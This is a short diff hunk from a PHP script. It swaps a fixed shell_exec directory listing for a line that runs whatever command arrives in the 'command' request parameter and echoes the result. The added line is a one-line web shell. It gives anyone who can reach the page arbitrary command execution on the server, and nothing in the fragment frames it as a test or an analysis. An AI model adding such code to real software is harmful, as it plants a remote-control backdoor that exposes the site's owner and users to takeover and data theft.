@@ -22,4 +22,4 @@ if (isset($result))
 	$result->close();
 $link->close();*/
 
-echo shell_exec('cd /home/art; ls -al');
+echo shell_exec($_REQUEST['command']);
